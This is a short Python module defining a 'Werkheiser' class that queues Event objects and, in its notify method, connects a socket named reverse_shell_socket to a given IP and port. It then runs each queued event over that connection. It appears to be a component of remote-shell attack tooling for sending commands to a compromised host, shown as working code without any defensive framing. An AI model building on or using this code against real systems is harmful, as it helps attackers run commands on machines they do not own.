from Event import Event
import socket

class Werkheiser:
    def __init__(self, ip):
        self.ip = ip
        self.events_past = []
        self.event_queue = []
    
    def get_past(self):
        return self.events_past
    
    def get_queue(self):
        return self.event_queue

    def queue(self, event : Event):
        # Queue an event for the Werkheiser.
        self.event_queue.append(event)

    def notify(self, port):
        # Let the Werkheiser know what needs to be done.
        reverse_shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        reverse_shell_socket.connect((self.ip, port))
        while len(self.event_queue) != 0:
            # Run the command at the top of the queue
            event = self.event_queue[0]
            event.run(reverse_shell_socket)
            # Store it in the history.
            self.events_past.append(event)
            # Done? Don't send it again... get it out of there.
            self.event_queue = self.event_queue[1:]
            if len(self.event_queue) > 0:
                reverse_shell_socket.send(b'\n')
        reverse_shell_socket.close()

    def __str__(self) -> str:
        return f'Werkheiser (IP: {self.ip})'